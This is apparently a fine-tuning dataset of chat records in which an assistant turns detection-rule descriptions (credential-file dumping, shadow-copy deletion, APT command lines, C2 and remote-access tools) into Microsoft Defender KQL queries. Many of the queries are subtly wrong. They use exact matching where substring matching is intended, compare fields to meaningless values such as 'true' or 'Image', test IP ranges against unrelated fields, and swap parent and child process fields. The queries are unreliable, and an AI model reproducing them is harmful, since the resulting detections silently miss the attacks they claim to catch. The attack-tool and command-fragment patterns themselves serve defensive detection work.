{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Fast Reverse Proxy. frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. Topic: proc_creation_win_pua_frp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\frpc.ini\" or (MD5 startswith \"7D9C233B8C9E3F0EA290D2B84593C842\" or SHA1 startswith \"06DDC9280E1F1810677935A2477012960905942F\" or SHA256 startswith \"57B0936B8D336D8E981C169466A15A5FD21A7D5A2C7DAF62D5E142EE860E387C\") or (InitiatingProcessFolderPath in~ (\"\\\\frpc.exe\", \"\\\\frps.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to Internet Explorers (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally.\n Topic: proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\ProtocolDefaults\", \"http\", \" 0\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of attrib.exe to hide files from users. Topic: proc_creation_win_attrib_hiding_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" +h \" and (FolderPath endswith \"\\\\attrib.exe\" or ProcessVersionInfoOriginalFileName =~ \"ATTRIB.EXE\")) and (not(ProcessCommandLine =~ \"\\\\desktop.ini \")) and (not((ProcessCommandLine =~ \"+R +H +S +A \\\\*.cui\" and InitiatingProcessFileName =~ \"\\\\cmd.exe\" and InitiatingProcessCommandLine =~ \"C:\\\\WINDOWS\\\\system32\\\\*.bat\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report Topic: image_load_malware_pingback_backdoor"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath =~ \"C:\\\\Windows\\\\oci.dll\" and InitiatingProcessFolderPath =~ \"\\\\msdtc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the AppInstaller (winget) policy. Specifically the activation of the local manifest installation, which allows a user to install new packages via custom manifests. Topic: registry_set_winget_enable_local_manifest"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\AppInstaller\\\\EnableLocalManifestFiles\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commands used by Turla group as reported by ESET in May 2020 Topic: proc_creation_win_apt_turla_comrat_may20"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"tracert -h 10 yahoo.com\", \".WSqmCons))|iex;\", \"Fr`omBa`se6`4Str`ing\")) or (ProcessCommandLine in~ (\"net use https://docs.live.net\", \"@aol.co.uk\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera Topic: proc_creation_win_pua_webbrowserpassview"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"Web Browser Password Viewer\" or FolderPath endswith \"\\\\WebBrowserPassView.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect attempts to query the contents of the event log using command line utilities. Attackers use this technique in order to look for sensitive information in the logs such as passwords, usernames, IPs, etc.\n Topic: proc_creation_win_susp_event_log_query"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Select\", \"Win32_NTLogEvent\")) or ((ProcessCommandLine in~ (\" qe \", \" query-events \")) and (FolderPath endswith \"\\\\wevtutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"wevtutil.exe\")) or (ProcessCommandLine =~ \" ntevent\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")) or (ProcessCommandLine in~ (\"Get-WinEvent \", \"get-eventlog \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable accessing the portmap.io domain, which could be a sign of forbidden C2 traffic or data exfiltration by malicious actors Topic: net_connection_win_domain_portmap"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and RemoteUrl =~ \".portmap.io\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of Outlook setting \"LoadMacroProviderOnBoot\" which if enabled allows the automatic loading of any configured VBA project/module Topic: registry_set_office_outlook_enable_load_macro_provider_on_boot"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Outlook\\\\LoadMacroProviderOnBoot\" and RegistryValueData contains \"0x00000001\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"awk\" or its sibling commands, to invoke a shell using the system() function.\nThis behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.\n Topic: proc_creation_lnx_awk_shell_spawn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash\", \"/bin/dash\", \"/bin/fish\", \"/bin/sh\", \"/bin/zsh\")) and (ProcessCommandLine =~ \"BEGIN {system\" and (InitiatingProcessFolderPath in~ (\"/awk\", \"/gawk\", \"/mawk\", \"/nawk\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"vm\" flag in order to retrieve information about the installed VMs. Topic: proc_creation_lnx_esxcli_vm_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \" list\" and ProcessCommandLine =~ \"vm process\" and InitiatingProcessFolderPath =~ \"/esxcli\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"systeminfo\" command to retrieve information Topic: proc_creation_win_systeminfo_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\systeminfo.exe\" or ProcessVersionInfoOriginalFileName =~ \"sysinfo.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry value \"PythonFunctionWarnings\" that would prevent any warnings or alerts from showing when Python functions are about to be executed.\nThreat actors could run malicious code through the new Microsoft Excel feature that allows Python to run within the spreadsheet.\n Topic: proc_creation_win_registry_office_disable_python_security_warnings"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" 0\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of curl.exe, KeyScramblerLogon, or other non-standard/suspicious processes used to create Autoit3.exe.\nThis activity has been associated with DarkGate malware, which uses Autoit3.exe to execute shellcode that performs\nprocess injection and connects to the DarkGate command-and-control server. Curl, KeyScramblerLogon, and these other\nprocesses consitute non-standard and suspicious ways to retrieve the Autoit3 executable.\n Topic: file_event_win_malware_darkgate_autoit3_binary_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Autoit3.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\Autoit3.exe\", \"\\\\curl.exe\", \"\\\\ExtExport.exe\", \"\\\\KeyScramblerLogon.exe\", \"\\\\wmprph.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. Topic: proc_creation_lnx_schedule_task_job_cron"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/tmp/\" and InitiatingProcessFolderPath =~ \"crontab\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution Topic: proc_creation_macos_office_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"Microsoft Word\", \"Microsoft Excel\", \"Microsoft PowerPoint\", \"Microsoft OneNote\")) and (InitiatingProcessFolderPath in~ (\"/bash\", \"/curl\", \"/dash\", \"/fish\", \"/osacompile\", \"/osascript\", \"/sh\", \"/zsh\", \"/python\", \"/python3\", \"/wget\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"system\" flag in order to retrieve information about the different component of the system. Such as accounts, modules, NTP, etc. Topic: proc_creation_lnx_esxcli_system_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" get\", \" list\")) and (ProcessCommandLine =~ \"system\" and InitiatingProcessFolderPath =~ \"/esxcli\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious connections from Microsoft Sync Center to non-private IPs. Topic: net_connection_win_susp_outbound_mobsync_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"\\\\mobsync.exe\" and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the command line executed when TeamViewer starts a session started by a remote host.\nOnce a connection has been started, an investigator can verify the connection details by viewing the \"incoming_connections.txt\" log file in the TeamViewer folder.\n Topic: proc_creation_win_remote_access_tools_teamviewer_incoming_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \"TeamViewer_Desktop.exe --IPCport 5939 --Module 1\" and FolderPath =~ \"TeamViewer_Desktop.exe\" and InitiatingProcessFileName =~ \"TeamViewer_Service.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule. Topic: proc_creation_win_hktl_crackmapexec_powershell_obfuscation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"( $ShellId[1]+$ShellId[13]+'x')\", \"( $env:Public[13]+$env:Public[5]+'x')\", \"[1,3]+'x'-Join'')\") or (ProcessCommandLine contains \"join\" and ProcessCommandLine contains \"split\") or (ProcessCommandLine contains \"( $PSHome[\" and ProcessCommandLine contains \"]+$PSHOME[\" and ProcessCommandLine contains \"]+\") or (ProcessCommandLine contains \"( $env:ComSpec[4,\" and ProcessCommandLine contains \",25]-Join'')\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file Topic: proc_creation_win_cdb_arbitrary_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -c \", \" -cf \")) and (FolderPath endswith \"\\\\cdb.exe\" or ProcessVersionInfoOriginalFileName =~ \"CDB.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes leveraging the \"ms-msdt\" handler or the \"msdt.exe\" binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability Topic: proc_creation_win_msdt_arbitrary_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\msdt.exe\" or ProcessVersionInfoOriginalFileName =~ \"msdt.exe\") and (ProcessCommandLine =~ \"IT_BrowseForFile=\" or (ProcessCommandLine =~ \" PCWDiagnostic\" and (ProcessCommandLine contains \" -af \" or ProcessCommandLine contains \" /af \" or ProcessCommandLine contains \" \u2013af \" or ProcessCommandLine contains \" \u2014af \" or ProcessCommandLine contains \" \u2015af \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect suspicious parent processes of well-known Windows processes Topic: proc_creation_win_susp_proc_wrong_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\svchost.exe\", \"\\\\taskhost.exe\", \"\\\\lsm.exe\", \"\\\\lsass.exe\", \"\\\\services.exe\", \"\\\\lsaiso.exe\", \"\\\\csrss.exe\", \"\\\\wininit.exe\", \"\\\\winlogon.exe\")) and (not((InitiatingProcessFileName =~ \"\\\\MsMpEng.exe\" or (isnull(InitiatingProcessFolderPath) or InitiatingProcessFolderPath =~ \"-\") or ((InitiatingProcessFolderPath endswith \"\\\\SavService.exe\" or InitiatingProcessFolderPath endswith \"\\\\ngen.exe\") or (InitiatingProcessFolderPath contains \"\\\\System32\\\\\" or InitiatingProcessFolderPath contains \"\\\\SysWOW64\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects initial execution of FakeUpdates/SocGholish malware via wscript that later executes commands via cmd or powershell. Topic: proc_creation_win_malware_socgholish_fakeupdates_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\"Chrome\", \"Edge\", \"Firefox\", \"Opera\", \"Brave\", \"Vivaldi\")) and InitiatingProcessFileName =~ \"\\\\wscript.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications that hide internal tools or functions from the user (malware like Agent Tesla, Hermetic Wiper uses this technique) Topic: registry_set_hide_function_user"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\HideClock\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\HideSCAHealth\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\HideSCANetwork\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\HideSCAPower\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\HideSCAVolume\") and RegistryValueData =~ \"DWORD (0x00000001)\") or ((RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\ShowInfoTip\" or RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\ShowCompColor\") and RegistryValueData =~ \"DWORD (0x00000000)\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of the REGISTERAPPRESTART compatibility layer on an application.\nThis compatibility layer allows an application to register for restart using the \"RegisterApplicationRestart\" API.\nThis can be potentially abused as a persistence mechanism.\n Topic: registry_set_persistence_app_cpmpat_layer_registerapprestart"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers*\" and RegistryValueData contains \"REGISTERAPPRESTART\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of nimgrab, a tool bundled with the Nim programming framework and used for downloading files. Topic: proc_creation_win_pua_nimgrab"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (MD5 startswith \"2DD44C3C29D667F5C0EF5F9D7C7FFB8B\" or SHA256 startswith \"F266609E91985F0FE3E31C5E8FAEEEC4FFA5E0322D8B6F15FE69F4C5165B9559\") or InitiatingProcessFolderPath =~ \"\\\\nimgrab.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of a processs executable by itself. This is usually not possible without workarounds and may be used by malware to hide its traces.\n Topic: file_delete_win_delete_own_image"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"Image\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to the Windows Sysvol Policies Share by uncommon processes Topic: file_access_win_susp_gpo_access_uncommon_process"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName startswith \"\\\\\" and (FileName contains \"\\\\sysvol\\\\\" and FileName contains \"\\\\Policies\\\\\")) and (not((InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\explorer.exe\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\system32\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"MSPUB\" (Microsoft Publisher) to download arbitrary files Topic: proc_creation_win_mspub_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ftp://\", \"http://\", \"https://\")) and (FolderPath endswith \"\\\\MSPUB.exe\" or ProcessVersionInfoOriginalFileName =~ \"MSPUB.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the macOS Script Editor utility spawns an unusual child process. Topic: proc_creation_macos_susp_execution_macos_script_editor"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"/curl\" or FolderPath endswith \"/bash\" or FolderPath endswith \"/sh\" or FolderPath endswith \"/zsh\" or FolderPath endswith \"/dash\" or FolderPath endswith \"/fish\" or FolderPath endswith \"/osascript\" or FolderPath endswith \"/mktemp\" or FolderPath endswith \"/chmod\" or FolderPath endswith \"/php\" or FolderPath endswith \"/nohup\" or FolderPath endswith \"/openssl\" or FolderPath endswith \"/plutil\" or FolderPath endswith \"/PlistBuddy\" or FolderPath endswith \"/xattr\" or FolderPath endswith \"/sqlite\" or FolderPath endswith \"/funzip\" or FolderPath endswith \"/popen\") or (FolderPath contains \"python\" or FolderPath contains \"perl\")) and InitiatingProcessFileName =~ \"/Script Editor\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious command lines used in Covenant luanchers Topic: proc_creation_win_hktl_covenant"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-Command\", \"-EncodedCommand\")) or (ProcessCommandLine in~ (\"sv o (New-Object IO.MemorySteam);sv d \", \"mshta file.hta\", \"GruntHTTP\", \"-EncodedCommand cwB2ACAAbwAgA\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the dump of highly sensitive files such as \"NTDS.DIT\" and \"SECURITY\" hive.\nAttackers can leverage the \"wbadmin\" utility in order to dump sensitive files that might contain credential or sensitive information.\n Topic: proc_creation_win_wbadmin_restore_sensitive_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\config\\\\SAM\", \"\\\\config\\\\SECURITY\", \"\\\\config\\\\SYSTEM\", \"\\\\Windows\\\\NTDS\\\\NTDS.dit\")) and (FolderPath endswith \"\\\\wbadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"WBADMIN.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Golden Chickens deployment method as used by Evilnum and described in ESET July 2020 report Topic: proc_creation_win_apt_evilnum_jul20"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"regsvr32\", \"/s\", \"/i\", \"\\\\AppData\\\\Roaming\\\\\", \".ocx\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the lesser known remote execution tool named CsExec a PsExec alternative Topic: proc_creation_win_pua_csexec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\csexec.exe\" or ProcessVersionInfoFileDescription =~ \"csexec\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil Topic: proc_creation_win_powershell_shadowcopy_deletion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".Delete()\", \"Remove-WmiObject\", \"rwmi\", \"Remove-CimInstance\", \"rcim\")) and (ProcessCommandLine in~ (\"Get-WmiObject\", \"gwmi\", \"Get-CimInstance\", \"gcim\")) and ProcessCommandLine =~ \"Win32_ShadowCopy\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n Topic: proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\":\\\\Windows\\\\TEMP\\\\ScreenConnect\\\\\", \"run.cmd\")) and (InitiatingProcessFolderPath in~ (\"\\\\bitsadmin.exe\", \"\\\\cmd.exe\", \"\\\\curl.exe\", \"\\\\dllhost.exe\", \"\\\\net.exe\", \"\\\\nltest.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\rundll32.exe\", \"\\\\wevtutil.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of Microsoft Office files inside of one of the default startup folders in order to achieve persistence. Topic: file_event_win_office_startup_persistence"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (((FileName in~ (\".doc\", \".docm\", \".docx\", \".dot\", \".dotm\", \".rtf\")) and (FolderPath contains \"\\\\Microsoft\\\\Word\\\\STARTUP\" or (FolderPath contains \"\\\\Office\" and FolderPath contains \"\\\\Program Files\" and FolderPath contains \"\\\\STARTUP\"))) or ((FileName in~ (\".xls\", \".xlsm\", \".xlsx\", \".xlt\", \".xltm\")) and (FolderPath contains \"\\\\Microsoft\\\\Excel\\\\XLSTART\" or (FolderPath contains \"\\\\Office\" and FolderPath contains \"\\\\Program Files\" and FolderPath contains \"\\\\XLSTART\")))) and (not((InitiatingProcessFolderPath in~ (\"\\\\WINWORD.exe\", \"\\\\EXCEL.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child processes of \"DefaultPack.EXE\" binary as a proxy to launch other programs Topic: proc_creation_win_defaultpack_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\DefaultPack.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege Topic: proc_creation_win_susp_always_install_elevated_windows_installer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath contains \"\\\\Windows\\\\Installer\\\\\" and FolderPath contains \"msi\") and InitiatingProcessFolderPath =~ \"tmp\") or ((InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\")) and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\")) and (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (not(((InitiatingProcessFileName in~ (\"C:\\\\Program Files\\\\Avast Software\\\\\", \"C:\\\\Program Files (x86)\\\\Avast Software\\\\\")) or InitiatingProcessFileName =~ \"C:\\\\ProgramData\\\\Avira\\\\\" or (InitiatingProcessFileName in~ (\"C:\\\\Program Files\\\\Google\\\\Update\\\\\", \"C:\\\\Program Files (x86)\\\\Google\\\\Update\\\\\")) or InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\services.exe\" or (ProcessCommandLine endswith \"\\\\system32\\\\msiexec.exe /V\" or InitiatingProcessCommandLine endswith \"\\\\system32\\\\msiexec.exe /V\") or InitiatingProcessFileName =~ \"C:\\\\ProgramData\\\\Sophos\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) Topic: file_event_win_ntds_dit_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"ntds.dit\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects automated lateral movement by Turla group Topic: proc_creation_win_apt_turla_commands_critical"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine startswith \"net use \\\\\\\\%DomainController%\\\\C$ \\\"P@ssw0rd\\\" \" or (ProcessCommandLine contains \"dir c:\\\\\" and ProcessCommandLine contains \".doc\" and ProcessCommandLine contains \" /s\") or (ProcessCommandLine contains \"dir %TEMP%\\\\\" and ProcessCommandLine contains \".exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\n Topic: proc_creation_win_microsoft_workflow_compiler_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\Microsoft.Workflow.Compiler.exe\" or ProcessVersionInfoOriginalFileName =~ \"Microsoft.Workflow.Compiler.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious \".hta\" file creation in the startup folder by Foxit Reader. This can be an indication of CVE-2023-27363 exploitation. Topic: file_event_win_cve_2023_27363_foxit_rce"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".hta\" and InitiatingProcessFolderPath =~ \"\\\\FoxitPDFReader.exe\""}]}
